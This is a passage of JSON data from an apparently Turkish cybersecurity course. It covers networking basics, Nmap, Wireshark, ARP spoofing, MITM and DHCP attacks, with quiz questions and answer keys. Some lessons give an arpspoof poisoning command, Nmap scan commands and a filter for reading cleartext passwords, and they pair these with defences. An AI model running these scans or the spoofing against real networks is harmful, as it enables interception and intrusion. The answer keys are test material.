      "content": "<h2>TCP/IP Modeli ve Katmanları</h2><p>TCP/IP (Transmission Control Protocol/Internet Protocol), bilgisayarların internet üzerinden iletişim kurmasını sağlayan temel ağ protokolleri kümesidir. Günümüz internet mimarisi bu model üzerine kuruludur.</p><p>TCP/IP modeli 4 ana katmandan oluşur:</p><ul><li><strong>Uygulama Katmanı (Application):</strong> Kullanıcı ile etkileşimde olan HTTP, FTP, SMTP, DNS gibi protokoller burada çalışır.</li><li><strong>Taşıma Katmanı (Transport):</strong> Verilerin uçtan uca akışını ve bütünlüğünü kontrol eder. TCP ve UDP burada yer alır.</li><li><strong>İnternet Katmanı (Internet):</strong> Veri paketlerinin IP adresleri kullanılarak hedefe yönlendirilmesinden sorumludur. IP ve ICMP burada çalışır.</li><li><strong>Ağ Erişim Katmanı (Network Access):</strong> Fiziksel kablolar, MAC adresleri ve ethernet donanımını kapsar.</li></ul>",
      "example": "<h3>Örnek Senaryo:</h3><p>Bir web tarayıcısına <code>siberkampus.org</code> yazıp sayfayı yüklediğinizde, veri yukarıdan aşağıya paketlenir: Uygulama (HTTP) -> Taşıma (TCP Port 80/443) -> İnternet (Kaynak ve Hedef IP) -> Ağ Erişim (MAC Adresleri).</p>",
      "questions": [
        {
          "q": "TCP/IP modelinde veri paketlerinin IP adresleri kullanılarak hedefe yönlendirilmesini sağlayan katman hangisidir?",
          "options": [
            "Uygulama Katmanı",
            "Taşıma Katmanı",
            "İnternet Katmanı",
            "Ağ Erişim Katmanı"
          ],
          "correct": 2
        },
        {
          "q": "HTTP, DNS ve FTP protokolleri TCP/IP modelinin hangi katmanında çalışır?",
          "options": [
            "Uygulama Katmanı",
            "Taşıma Katmanı",
            "İnternet Katmanı",
            "Ağ Erişim Katmanı"
          ],
          "correct": 0
        },
        {
          "q": "Verinin uçtan uca akış kontrolünü ve bütünlüğünü sağlayan Taşıma Katmanı protokolü hangisidir?",
          "options": [
            "IP",
            "TCP",
            "ICMP",
            "MAC"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "ag-02",
      "title": "OSI Referans Modeli",
      "content": "<h2>OSI Referans Modeli</h2><p>OSI (Open Systems Interconnection) modeli, ağ iletişimini standartlaştırmak için ISO tarafından geliştirilmiş 7 katmanlı teorik bir referans modelidir.</p><p>Katmanlar aşağıdan yukarıya şu şekildedir:</p><ol><li><strong>Fiziksel (Physical):</strong> Kablolar, fiber optik, bit düzeyinde iletim.</li><li><strong>Veri Bağı (Data Link):</strong> Çerçeveleme (Framing), MAC adresleri, anahtarlayıcılar (Switch).</li><li><strong>Ağ (Network):</strong> IP adresleme, yönlendirme (Routing), yönlendiriciler (Router).</li><li><strong>Taşıma (Transport):</strong> Segmentasyon, akış kontrolü, TCP/UDP.</li><li><strong>Oturum (Session):</strong> Bağlantıların kurulması, yönetilmesi ve sonlandırılması.</li><li><strong>Sunum (Presentation):</strong> Veri biçimlendirme, şifreleme, sıkıştırma (SSL/TLS, JPEG).</li><li><strong>Uygulama (Application):</strong> Kullanıcı arayüzü, HTTP, FTP.</li></ol>",
      "example": "<h3>Örnek Analiz:</h3><p>Şifreleme (SSL/TLS) veya veri sıkıştırma işlemleri OSI modelinde 6. katman olan <strong>Sunum Katmanı</strong>'nda gerçekleşir. IP yönlendirmesi ise 3. katman olan <strong>Ağ Katmanı</strong>'nda yapılır.</p>",
      "questions": [
        {
          "q": "OSI referans modelinde MAC adresleri ve çerçeveleme (framing) hangi katmanda yer alır?",
          "options": [
            "Fiziksel Katman",
            "Veri Bağı Katmanı",
            "Ağ Katmanı",
            "Taşıma Katmanı"
          ],
          "correct": 1
        },
        {
          "q": "Veri şifreleme, kodlama ve sıkıştırma işlemleri hangi OSI katmanının sorumluluğundadır?",
          "options": [
            "Sunum Katmanı",
            "Uygulama Katmanı",
            "Oturum Katmanı",
            "Taşıma Katmanı"
          ],
          "correct": 0
        },
        {
          "q": "Yönlendiriciler (Router) ve IP protokolü hangi OSI katmanında çalışır?",
          "options": [
            "Veri Bağı Katmanı",
            "Ağ Katmanı",
            "Taşıma Katmanı",
            "Uygulama Katmanı"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "ag-03",
      "title": "IP Adresleme ve Alt Ağlar",
      "content": "<h2>IP Adresleme ve Alt Ağlar (Subnetting)</h2><p>IP (Internet Protocol) adresi, ağdaki her cihaza atanan benzersiz bir kimlik numarasıdır. IPv4 adresleri 32 bitliktir ve 4 oktetten (örneğin 192.168.1.1) oluşur.</p><p><strong>Alt Ağ Oluşturma (Subnetting):</strong> Büyük bir ağı daha küçük, yönetilebilir ağlara bölme işlemidir. Bu işlem ağ performansını artırır ve güvenliği kolaylaştırır. Alt ağ maskesi (Subnet Mask), bir IP adresinin hangi kısmının ağ (Network ID) ve hangi kısmının konak (Host ID) olduğunu belirtir.</p>",
      "example": "<h3>Subnetting Örneği:</h3><p><code>192.168.1.0/24</code> ağında alt ağ maskesi <code>255.255.255.0</code>'dır. Bu ağda toplam 256 IP adresi bulunur, ancak ilk adres (Ağ Adresi: 192.168.1.0) ve son adres (Yayın Adresi: 192.168.1.255) cihazlara atanamaz. Kullanılabilir host sayısı 254'tür.</p>",
      "questions": [
        {
          "q": "IPv4 adresleri toplam kaç bit uzunluğundadır?",
          "options": [
            "16 bit",
            "32 bit",
            "64 bit",
            "128 bit"
          ],
          "correct": 1
        },
        {
          "q": "192.168.1.0/24 ağındaki ilk kullanılabilir (cihaza atanabilir) IP adresi hangisidir?",
          "options": [
            "192.168.1.0",
            "192.168.1.1",
            "192.168.1.254",
            "192.168.1.255"
          ],
          "correct": 1
        },
        {
          "q": "Bir ağdaki yayın (broadcast) adresi ne amaçla kullanılır?",
          "options": [
            "Sadece sunucuya veri göndermek için",
            "Ağdaki tüm cihazlara aynı anda veri göndermek için",
            "IP adresini MAC adresine dönüştürmek için",
            "Ağları birbirine bağlamak için"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "ag-04",
      "title": "MAC Adresleri ve ARP Protokolü",
      "content": "<h2>MAC Adresi ve ARP Protokolü</h2><p><strong>MAC (Media Access Control) Adresi:</strong> Ağ kartı üreticisi tarafından donanıma yazılan, 48 bitlik fiziksel ağ adresidir. Değiştirilemez (donanımsal olarak) ve benzersizdir.</p><p><strong>ARP (Address Resolution Protocol):</strong> Yerel ağda, IP adresi bilinen bir cihazın fiziksel MAC adresini bulmak için kullanılan protokoldür. Cihazlar ağda iletişim kurmadan önce ARP isteği (ARP Request) yayınlayarak hedef cihazın MAC adresini öğrenir ve ARP tablosunda önbelleğe alır.</p>",
      "example": "<h3>ARP İstek Akışı:</h3><p>Cihaz A (192.168.1.2), Cihaz B'nin (192.168.1.5) MAC adresini bilmiyorsa ağa bir yayın gönderir: <i>'192.168.1.5 IP adresine kim sahip? Lütfen bana MAC adresinizi bildirin.'</i> Sadece Cihaz B bu isteğe kendi MAC adresiyle yanıt verir.</p>",
      "questions": [
        {
          "q": "MAC adresleri toplam kaç bit uzunluğundadır?",
          "options": [
            "24 bit",
            "32 bit",
            "48 bit",
            "64 bit"
          ],
          "correct": 2
        },
        {
          "q": "IP adresini fiziksel MAC adresine çözümlemekten sorumlu ağ protokolü hangisidir?",
          "options": [
            "DHCP",
            "DNS",
            "ARP",
            "ICMP"
          ],
          "correct": 2
        },
        {
          "q": "ARP istek mesajı ağda ne tür bir iletim yöntemiyle gönderilir?",
          "options": [
            "Unicast (Tekli)",
            "Multicast (Çoklu)",
            "Broadcast (Yayın)",
            "Anycast"
          ],
          "correct": 2
        }
      ]
    },
    {
      "id": "ag-05",
      "title": "DHCP Protokolü",
      "content": "<h2>DHCP (Dynamic Host Configuration Protocol)</h2><p>DHCP, ağa bağlanan cihazlara otomatik olarak IP adresi, alt ağ maskesi, varsayılan ağ geçidi (Gateway) ve DNS sunucusu bilgilerini atayan uygulama katmanı protokolüdür.</p><p>DHCP çalışma mantığı 4 aşamalı <strong>DORA</strong> sürecinden oluşur:</p><ol><li><strong>Discover (Keşif):</strong> Cihaz ağda DHCP sunucusu arar (Broadcast).</li><li><strong>Offer (Teklif):</strong> DHCP sunucusu cihaza boş bir IP adresi teklif eder.</li><li><strong>Request (İstek):</strong> Cihaz teklif edilen IP adresini kullanmak istediğini belirtir.</li><li><strong>Acknowledge (Onay):</strong> Sunucu IP'yi cihaza tahsis eder ve süreci onaylar.</li></ol>",
      "example": "<h3>DORA Analizi:</h3><p>Yeni açılan bir bilgisayarın ilk yaptığı işlem ağa bir <strong>DHCP Discover</strong> paketi yayınlamaktır. Bu paket sayesinde IP adresi olmayan cihaz ağdaki sunucuyu bulur.</p>",
      "questions": [
        {
          "q": "DHCP protokolünün çalışma mantığını özetleyen kısaltma hangisidir?",
          "options": [
            "DNSA",
            "ARPD",
            "DORA",
            "ICMP"
          ],
          "correct": 2
        },
        {
          "q": "Ağa yeni katılan ve IP'si olmayan bir cihazın DHCP sunucusunu bulmak için attığı ilk paket hangisidir?",
          "options": [
            "Offer",
            "Request",
            "Acknowledge",
            "Discover"
          ],
          "correct": 3
        },
        {
          "q": "DHCP sunucusu ağdaki cihazlara hangi bilgiyi otomatik olarak atamaz?",
          "options": [
            "IP Adresi",
            "DNS Sunucusu",
            "Donanım MAC Adresi",
            "Varsayılan Ağ Geçidi"
          ],
          "correct": 2
        }
      ]
    },
    {
      "id": "ag-06",
      "title": "DNS Protokolü",
      "content": "<h2>DNS (Domain Name System)</h2><p>DNS, insanların kolayca hatırlayabileceği alan adlarını (örn. <code>google.com</code>), bilgisayarların anlayabileceği sayısal IP adreslerine (örn. <code>142.250.185.78</code>) çeviren internetin telefon rehberidir.</p><p>Temel DNS Kayıt Türleri:</p><ul><li><strong>A Kaydı:</strong> Alan adını IPv4 adresine yönlendirir.</li><li><strong>AAAA Kaydı:</strong> Alan adını IPv6 adresine yönlendirir.</li><li><strong>CNAME (Alias):</strong> Bir alan adını başka bir alan adına yönlendirir.</li><li><strong>MX (Mail Exchanger):</strong> Alan adının e-posta sunucusunu belirtir.</li><li><strong>TXT Kaydı:</strong> Doğrulama ve güvenlik bilgileri (SPF, DKIM) için metin verisi tutar.</li></ul>",
      "example": "<h3>Sorgu Örneği:</h3><p>Terminalde <code>nslookup siberkampus.org</code> veya <code>dig siberkampus.org</code> komutunu çalıştırarak alan adının arkasındaki A kaydını (IP adresini) görebilirsiniz.</p>",
      "questions": [
        {
          "q": "Bir alan adını IPv4 adresine yönlendiren DNS kayıt türü hangisidir?",
          "options": [
            "MX",
            "AAAA",
            "A",
            "CNAME"
          ],
          "correct": 2
        },
        {
          "q": "E-posta sunucularının tespiti ve yönlendirilmesi için hangi DNS kaydı kullanılır?",
          "options": [
            "TXT",
            "MX",
            "A",
            "NS"
          ],
          "correct": 1
        },
        {
          "q": "DNS hangi taşıma katmanı portunu varsayılan olarak kullanır?",
          "options": [
            "Port 53 (UDP/TCP)",
            "Port 80 (TCP)",
            "Port 443 (TCP)",
            "Port 22 (TCP)"
          ],
          "correct": 0
        }
      ]
    },
    {
      "id": "ag-07",
      "title": "TCP ve UDP Protokolleri",
      "content": "<h2>TCP ve UDP Protokolleri</h2><p>Taşıma katmanının en önemli iki protokolü TCP ve UDP'dir. İletişim ihtiyaçlarına göre farklı avantajlar sunarlar.</p><p><strong>TCP (Transmission Control Protocol):</strong> Bağlantı yönelimlidir (Connection-oriented). Veri göndermeden önce bağlantı kurar. Hata kontrolü, akış kontrolü ve paket sıralaması yapar. Güvenilirdir ancak yavaştır. (HTTP, SSH, SMTP).</p><p><strong>UDP (User Datagram Protocol):</strong> Bağlantısızdır (Connectionless). Paketlerin ulaşıp ulaşmadığını kontrol etmez. Hızlıdır ancak güvensizdir. (DNS, Canlı Yayın, Online Oyun).</p>",
      "example": "<h3>Karşılaştırma:</h3><p>Bir web sitesine girdiğinizde verinin eksiksiz gelmesi gerektiği için <strong>TCP</strong> kullanılır. Ancak bir görüntülü konuşmada anlık kesintiler tolere edilebildiği ve hız kritik olduğu için <strong>UDP</strong> tercih edilir.</p>",
      "questions": [
        {
          "q": "Aşağıdakilerden hangisi UDP protokolünün bir özelliğidir?",
          "options": [
            "Bağlantı yönelimli olması",
            "Hata ve akış kontrolü yapması",
            "Veriyi çok hızlı ve kontrolsüz göndermesi",
            "Paket sıralamasını garanti etmesi"
          ],
          "correct": 2
        },
        {
          "q": "Bağlantı yönelimli (connection-oriented) ve güvenli veri iletimi sağlayan protokol hangisidir?",
          "options": [
            "UDP",
            "IP",
            "TCP",
            "ICMP"
          ],
          "correct": 2
        },
        {
          "q": "Aşağıdaki protokollerden hangisi taşıma katmanında UDP kullanır?",
          "options": [
            "HTTP",
            "HTTPS",
            "DNS (Sorgular)",
            "SSH"
          ],
          "correct": 2
        }
      ]
    },
    {
      "id": "ag-08",
      "title": "TCP Üçlü El Sıkışma",
      "content": "<h2>TCP Üçlü El Sıkışma (Three-Way Handshake)</h2><p>TCP protokolünde iki cihaz arasında güvenli bir veri aktarımı başlamadan önce bağlantının kurulması gerekir. Bu işleme <strong>Üçlü El Sıkışma</strong> denir.</p><p>Adımlar şu şekildedir:</p><ol><li><strong>SYN (Synchronize):</strong> İstemci, sunucuya bağlantı kurmak istediğini belirten SYN bayraklı bir paket gönderir.</li><li><strong>SYN-ACK (Synchronize-Acknowledge):</strong> Sunucu isteği kabul eder ve istemciye SYN ve ACK bayraklı paketle yanıt verir.</li><li><strong>ACK (Acknowledge):</strong> İstemci, sunucunun yanıtını aldığını belirten ACK bayraklı bir paket gönderir ve bağlantı kurulur (ESTABLISHED).</li></ol>",
      "example": "<h3>Bağlantı Sonlandırma (Teardown):</h3><p>TCP bağlantısını kapatmak için ise 4 adımlı el sıkışma yapılır ve bu süreçte <strong>FIN (Finish)</strong> bayrağı kullanılır.</p>",
      "questions": [
        {
          "q": "TCP el sıkışma sürecini başlatan ilk paket hangi bayrağa sahiptir?",
          "options": [
            "ACK",
            "SYN",
            "FIN",
            "RST"
          ],
          "correct": 1
        },
        {
          "q": "Sunucunun istemciden gelen bağlantı isteğini kabul ettiğini belirten paket hangisidir?",
          "options": [
            "SYN",
            "ACK",
            "SYN-ACK",
            "FIN-ACK"
          ],
          "correct": 2
        },
        {
          "q": "TCP bağlantısını sonlandırmak (kapatmak) için kullanılan bayrak hangisidir?",
          "options": [
            "SYN",
            "RST",
            "FIN",
            "URG"
          ],
          "correct": 2
        }
      ]
    },
    {
      "id": "ag-09",
      "title": "Portlar ve Protokoller",
      "content": "<h2>Portlar ve Protokoller</h2><p>Portlar, ağdaki bir bilgisayarda çalışan farklı servisleri ve uygulamaları ayırt etmek için kullanılan 16 bitlik sayısal adreslerdir (0 - 65535 arası).</p><p>Sık Kullanılan Standart Portlar:</p><ul><li><strong>21:</strong> FTP (Dosya Aktarımı)</li><li><strong>22:</strong> SSH (Güvenli Uzak Bağlantı)</li><li><strong>23:</strong> Telnet (Şifresiz Uzak Bağlantı - Güvensiz)</li><li><strong>25:</strong> SMTP (E-posta Gönderimi)</li><li><strong>53:</strong> DNS (Alan Adı Çözümleme)</li><li><strong>80:</strong> HTTP (Şifresiz Web İletişimi)</li><li><strong>443:</strong> HTTPS (Şifreli/Güvenli Web İletişimi)</li></ul>",
      "example": "<h3>Güvenlik Notu:</h3><p>Sızma testlerinde ilk hedef, Telnet (23) veya FTP (21) gibi şifresiz veri aktaran güvensiz protokolleri tespit ederek ağ trafiğinden kullanıcı şifrelerini dinlemektir.</p>",
      "questions": [
        {
          "q": "Güvenli uzak terminal bağlantısı (SSH) varsayılan olarak hangi port üzerinden çalışır?",
          "options": [
            "Port 21",
            "Port 22",
            "Port 23",
            "Port 80"
          ],
          "correct": 1
        },
        {
          "q": "HTTPS (Şifreli Web Trafiği) protokolünün varsayılan portu hangisidir?",
          "options": [
            "Port 80",
            "Port 443",
            "Port 8080",
            "Port 22"
          ],
          "correct": 1
        },
        {
          "q": "Telnet (Port 23) protokolünün siber güvenlik açısından en büyük riski nedir?",
          "options": [
            "Çok yavaş çalışması",
            "Tüm trafiği ve şifreleri açık metin (cleartext) olarak göndermesi",
            "Port taramalarında tespit edilememesi",
            "Sadece Unix sistemlerde çalışması"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "ag-10",
      "title": "Nmap Temelleri ve Taramalar",
      "content": "<h2>Nmap Temelleri</h2><p>Nmap (Network Mapper), ağ keşfi ve güvenlik zafiyeti analizi için kullanılan açık kaynaklı bir araçtır. Ağdaki aktif cihazları, açık portları ve çalışan servisleri tespit eder.</p><p>Temel Tarama Türleri:</p><ul><li><strong>SYN Taraması (`-sS`):</strong> Yarım açık (Half-open) taramadır. Hızlıdır ve doğrudan TCP bağlantısı kurmadığı için daha az iz bırakır (Gizli tarama).</li><li><strong>TCP Bağlantı Taraması (`-sT`):</strong> Tam bir 3'lü el sıkışma gerçekleştirir. Sistem loglarında iz bırakır ancak root yetkisi gerektirmez.</li><li><strong>UDP Taraması (`-sU`):</strong> Ağdaki açık UDP portlarını tespit etmek için kullanılır.</li></ul>",
      "example": "<h3>Komut Örneği:</h3><p>Hedef sisteme hızlı ve gizli bir SYN taraması başlatmak için terminale <code>nmap -sS 192.168.1.100</code> yazabilirsiniz.</p>",
      "questions": [
        {
          "q": "Aşağıdakilerden hangisi tam bir TCP 3'lü el sıkışması gerçekleştirmeyen yarım açık (half-open) Nmap taramasıdır?",
          "options": [
            "TCP Connect Scan (-sT)",
            "SYN Scan (-sS)",
            "UDP Scan (-sU)",
            "Xmas Scan (-sX)"
          ],
          "correct": 1
        },
        {
          "q": "Nmap ile UDP portlarını taramak için hangi parametre kullanılmalıdır?",
          "options": [
            "-sS",
            "-sT",
            "-sU",
            "-sP"
          ],
          "correct": 2
        },
        {
          "q": "SYN taramasının (-sS) TCP taramasına (-sT) göre en büyük avantajı nedir?",
          "options": [
            "Hiçbir cihaz tarafından engellenememesi",
            "Daha hızlı olması ve hedef sistem loglarında daha az iz bırakması",
            "Şifreli servisleri çözebilmesi",
            "Root yetkisi gerektirmemesi"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "ag-11",
      "title": "Nmap Versiyon ve OS Tespiti",
      "content": "<h2>Nmap Versiyon ve İşletim Sistemi Tespiti</h2><p>Bir sızma testinde açık portları bulmak yeterli değildir. Hedefte çalışan yazılımların tam versiyonlarını ve işletim sistemini bilmek, uygun exploit'i seçmek için şarttır.</p><p>Gelişmiş Nmap Parametreleri:</p><ul><li><strong>`-sV` (Version Detection):</strong> Açık portlarda çalışan servislerin tam adını ve versiyon bilgisini (örn. Apache 2.4.41) tespit eder.</li><li><strong>`-O` (OS Detection):</strong> Hedef cihazın işletim sistemini (Linux, Windows vb.) tahmin eder.</li><li><strong>`-A` (Aggressive Scan):</strong> OS tespiti, versiyon tespiti, script taraması ve traceroute işlemlerini tek seferde yapar.</li></ul>",
      "example": "<h3>Komut Örneği:</h3><p>Hedefe yönelik agresif bir tarama başlatmak ve işletim sistemi ile servis sürümlerini öğrenmek için: <code>nmap -A 192.168.1.50</code> komutu çalıştırılır.</p>",
      "questions": [
        {
          "q": "Nmap taramasında açık portlardaki servislerin versiyon bilgilerini tespit etmek için hangi parametre kullanılır?",
          "options": [
            "-sS",
            "-sV",
            "-O",
            "-sT"
          ],
          "correct": 1
        },
        {
          "q": "Hedef makinenin işletim sistemini (OS) tespit etmek için kullanılan Nmap parametresi hangisidir?",
          "options": [
            "-O",
            "-sV",
            "-sP",
            "-p-"
          ],
          "correct": 0
        },
        {
          "q": "Nmap'te '-A' (Aggressive) parametresi aşağıdakilerden hangisini gerçekleştirmez?",
          "options": [
            "OS Tespiti",
            "Servis Versiyon Tespiti",
            "Güvenlik Duvarını Kapatma",
            "Traceroute Analizi"
          ],
          "correct": 2
        }
      ]
    },
    {
      "id": "ag-12",
      "title": "Nmap Scripting Engine (NSE)",
      "content": "<h2>Nmap Scripting Engine (NSE)</h2><p>NSE, Nmap'in en güçlü özelliklerinden biridir. Kullanıcıların önceden yazılmış Lua script'lerini kullanarak ağ taramalarını otomatikleştirmesini, güvenlik açıklarını keşfetmesini ve hatta basit exploit işlemleri yapmasını sağlar.</p><p>NSE Script Kategorileri:</p><ul><li><strong>safe:</strong> Ağ trafiğini bozmayan, sisteme zarar vermeyen güvenli scriptler.</li><li><strong>vuln:</strong> Hedef sistemde bilinen güvenlik açıklarını (CVE'leri) kontrol eder.</li><li><strong>brute:</strong> FTP, SSH, SQL gibi servislere yönelik kaba kuvvet saldırısı yapar.</li><li><strong>exploit:</strong> Güvenlik açıklarını sömürmeye çalışır.</li></ul>",
      "example": "<h3>Örnek Komut:</h3><p>Hedefteki SMB (Samba) servisinin bilinen açıklarını (MS17-010 EternalBlue gibi) taramak için: <code>nmap --script vuln -p 445 192.168.1.100</code> kullanılır.</p>",
      "questions": [
        {
          "q": "Nmap script'lerini (NSE) çalıştırmak için kullanılan temel parametre hangisidir?",
          "options": [
            "-sS",
            "--script",
            "-sV",
            "-O"
          ],
          "correct": 1
        },
        {
          "q": "Hedef sistemdeki bilinen açıkları (vulnerabilities) tespit etmek için hangi NSE script kategorisi seçilmelidir?",
          "options": [
            "safe",
            "vuln",
            "brute",
            "default"
          ],
          "correct": 1
        },
        {
          "q": "NSE scriptleri hangi programlama diliyle yazılmıştır?",
          "options": [
            "Python",
            "JavaScript",
            "Lua",
            "Bash"
          ],
          "correct": 2
        }
      ]
    },
    {
      "id": "ag-13",
      "title": "Wireshark ile Paket Analizine Giriş",
      "content": "<h2>Wireshark ile Paket Analizi</h2><p>Wireshark, ağ trafiğini canlı olarak yakalayan (sniffing) ve paket düzeyinde inceleyen en popüler ağ analiz aracıdır.</p><p>Ağ kartları varsayılan olarak sadece kendi üzerlerine gelen trafiği işler. Wireshark ile tüm ağ trafiğini dinlemek için ağ kartının <strong>Promiscuous Mode (Karışık Mod)</strong> konumuna getirilmesi gerekir. Bu mod aktif edildiğinde kart, hedefine bakılmaksızın kablodan geçen tüm paketleri yakalar.</p>",
      "example": "<h3>Kullanım Alanı:</h3><p>Ağda şüpheli bir yavaşlık veya siber saldırı şüphesi olduğunda, Wireshark başlatılarak ağdaki ARP yayınları, DNS sorguları ve TCP bağlantıları canlı olarak izlenir.</p>",
      "questions": [
        {
          "q": "Wireshark aracının temel işlevi aşağıdakilerden hangisidir?",
          "options": [
            "Şifre kırma",
            "Ağ trafiğini yakalama ve paket analizi yapma",
            "Güvenlik duvarı kuralları yazma",
            "DDoS saldırısı başlatma"
          ],
          "correct": 1
        },
        {
          "q": "Ağ kartının hedefine bakılmaksızın ağdaki tüm paketleri yakalamasını sağlayan mod hangisidir?",
          "options": [
            "Monitor Mode",
            "Promiscuous Mode (Karışık Mod)",
            "Managed Mode",
            "Ad-Hoc Mode"
          ],
          "correct": 1
        },
        {
          "q": "Wireshark ile yakalanan paket kayıtlarının standart dosya uzantısı hangisidir?",
          "options": [
            ".txt",
            ".pcap / .pcapng",
            ".log",
            ".exe"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "ag-14",
      "title": "Wireshark Filtreleme Teknikleri",
      "content": "<h2>Wireshark Filtreleme ve Ağ Trafiği İnceleme</h2><p>Wireshark ile saniyede binlerce paket yakalanabilir. Aradığımız kanıtları bulmak için gelişmiş filtreleme tekniklerini kullanmak zorundayız.</p><p>Sık Kullanılan Wireshark Filtreleri:</p><ul><li>`ip.addr == 192.168.1.50`: Sadece bu IP adresine giden veya gelen paketleri gösterir.</li><li>`tcp.port == 80`: Sadece HTTP (port 80) trafiğini listeler.</li><li>`http.request.method == \"POST\"`: Web formlarından gönderilen verileri (kullanıcı adı, şifre vb.) listeler.</li><li>`dns`: Sadece alan adı çözümleme paketlerini listeler.</li></ul>",
      "example": "<h3>Uygulama:</h3><p>Şifresi çalınan bir kullanıcının trafiğini analiz etmek için filtre alanına <code>http.request.method == \"POST\"</code> yazılarak arama yapılır. Paket içeriğindeki <i>Form Item</i> kısmında açık şifreler okunabilir.</p>",
      "questions": [
        {
          "q": "Wireshark'ta sadece 192.168.1.10 IP adresiyle ilişkili trafiği listelemek için hangi filtre kullanılır?",
          "options": [
            "ip.src == 192.168.1.10",
            "ip.addr == 192.168.1.10",
            "ip.dst == 192.168.1.10",
            "host 192.168.1.10"
          ],
          "correct": 1
        },
        {
          "q": "Web sitelerine gönderilen POST isteklerini (örn. giriş bilgileri) Wireshark'ta filtrelemek için en uygun ifade hangisidir?",
          "options": [
            "http",
            "tcp.port == 80",
            "http.request.method == \"POST\"",
            "post.request"
          ],
          "correct": 2
        },
        {
          "q": "Filtre alanına yazılan 'dns' ifadesi neyi listeler?",
          "options": [
            "Sadece web sitesi trafiğini",
            "Tüm UDP paketlerini",
            "Alan adı sorgulama ve yanıt paketlerini",
            "IP adresi olmayan paketleri"
          ],
          "correct": 2
        }
      ]
    },
    {
      "id": "ag-15",
      "title": "ARP Spoofing Saldırısı",
      "content": "<h2>ARP Spoofing (ARP Zehirlenmesi)</h2><p>ARP protokolünün kimlik doğrulama mekanizması yoktur. Ağa bağlı herhangi bir cihaz, istek gelmeden de ağa sahte ARP yanıtları (gratuitous ARP) gönderebilir.</p><p><strong>ARP Spoofing:</strong> Saldırganın, ağ geçidine (Gateway) kendisini kurban cihaz olarak tanıtması; kurban cihaza ise kendisini ağ geçidi (Gateway) olarak tanıtması durumudur. Bu sayede kurbanın tüm internet trafiği saldırganın bilgisayarı üzerinden akar.</p>",
      "example": "<h3>Saldırı Adımları:</h3><p>Saldırgan Kali Linux üzerinden <code>arpspoof -i eth0 -t 192.168.1.5 192.168.1.1</code> komutunu çalıştırarak kurbanın (192.168.1.5) ARP tablosunu zehirler ve kendini modem gibi gösterir.</p>",
      "questions": [
        {
          "q": "ARP Spoofing saldırısının temel nedeni nedir?",
          "options": [
            "ARP protokolünün şifreli olması",
            "ARP protokolünde kimlik doğrulama (authentication) olmaması",
            "IP adreslerinin yetersizliği",
            "Switch'lerin çok yavaş çalışması"
          ],
          "correct": 1
        },
        {
          "q": "ARP Spoofing saldırısı yapan bir saldırgan yerel ağda hangi konuma erişmiş olur?",
          "options": [
            "Domain Controller",
            "Ortadaki Adam (Man-in-the-Middle)",
            "Dış Ağ DNS Sunucusu",
            "Veritabanı Yöneticisi"
          ],
          "correct": 1
        },
        {
          "q": "ARP Zehirlenmesi saldırısından korunmak için yerel ağda hangi güvenlik önlemi uygulanmalıdır?",
          "options": [
            "WPA3 Şifreleme",
            "Dinamik ARP Denetimi (Dynamic ARP Inspection - DAI)",
            "Güçlü Parolalar",
            "HTTP yerine HTTPS kullanmak"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "ag-16",
      "title": "Man-in-the-Middle (MITM) Saldırıları",
      "content": "<h2>Man-in-the-Middle (Ortadaki Adam) Saldırıları</h2><p>MITM, bir saldırganın iki cihaz (örneğin kurban bilgisayar ile internet ağ geçidi) arasındaki iletişimi gizlice dinlemesi, araya girerek veriyi okuması veya değiştirmesidir.</p><p>Saldırgan araya girdikten sonra trafiği analiz eder. Eğer trafik şifrelenmemişse (HTTP, FTP, Telnet), kurbanın girdiği şifreler, e-postalar ve kişisel veriler açıkça okunabilir. Korunmanın en etkili yolu tüm trafiği uçtan uca şifrelemektir (HTTPS, VPN, SSH).</p>",
      "example": "<h3>Saldırı Önleme:</h3><p>Web sitelerinde HTTPS kullanıldığında, saldırgan araya girse bile trafik şifreli (SSL/TLS) olduğu için verinin içeriğini okuyamaz, sadece anlamsız karmaşık baytlar görür.</p>",
      "questions": [
        {
          "q": "Aşağıdakilerden hangisi Man-in-the-Middle (MITM) saldırılarına karşı en etkili koruma yöntemidir?",
          "options": [
            "Antivirüs kullanmak",
            "Trafiği uçtan uca şifrelemek (HTTPS, SSL/TLS, VPN)",
            "IP adresini gizlemek",
            "Daha hızlı bir yönlendirici kullanmak"
          ],
          "correct": 1
        },
        {
          "q": "Ortadaki adam konumundaki bir saldırgan şifreli HTTPS trafiğini doğrudan okuyabilir mi?",
          "options": [
            "Evet, tüm şifreli verileri anında okur",
            "Hayır, veriler SSL/TLS ile şifrelendiği için çözemez",
            "Sadece kurbanın tarayıcısı eskiyse okur",
            "Sadece kablolu ağlardaysa okur"
          ],
          "correct": 1
        },
        {
          "q": "Aşağıdaki protokollerden hangisiyle taşınan veriler MITM saldırısında açık metin olarak sızdırılabilir?",
          "options": [
            "HTTPS",
            "SFTP",
            "HTTP",
            "SSH"
          ],
          "correct": 2
        }
      ]
    },
    {
      "id": "ag-17",
      "title": "DHCP Starvation ve Rogue DHCP",
      "content": "<h2>DHCP Starvation ve Rogue DHCP</h2><p>DHCP servisleri ağ güvenliğinde zayıf halkalardan biridir ve iki temel saldırıya maruz kalabilir:</p><p><strong>1. DHCP Starvation (Aç Bırakma):</strong> Saldırgan, saniyeler içinde binlerce sahte MAC adresi üreterek DHCP sunucusuna istek atar ve havuzdaki tüm boş IP adreslerini tüketir. Ağdaki yeni cihazlar IP alamaz.</p><p><strong>2. Rogue DHCP (Sahte DHCP Sunucusu):</strong> Havuz boşaldıktan sonra saldırgan ağda kendi sahte DHCP sunucusunu başlatır. Ağa yeni bağlanan cihazlara kendi sahte IP yapılandırmasını (sahte ağ geçidi ve sahte DNS adresi) dağıtarak MITM saldırısı gerçekleştirir.</p>",
      "example": "<h3>Saldırı Engelleme:</h3><p>Cisco switch'lerde <strong>DHCP Snooping</strong> özelliği aktif edilerek sadece güvenilir portlardan DHCP Offer paketlerinin geçişine izin verilir, sahte DHCP sunucuları engellenir.</p>",
      "questions": [
        {
          "q": "DHCP sunucusundaki tüm boş IP adreslerini sahte isteklerle tüketerek ağ servislerini kilitleyen saldırı hangisidir?",
          "options": [
            "ARP Spoofing",
            "DHCP Starvation",
            "DNS Poisoning",
            "SYN Flood"
          ],
          "correct": 1
        },
        {
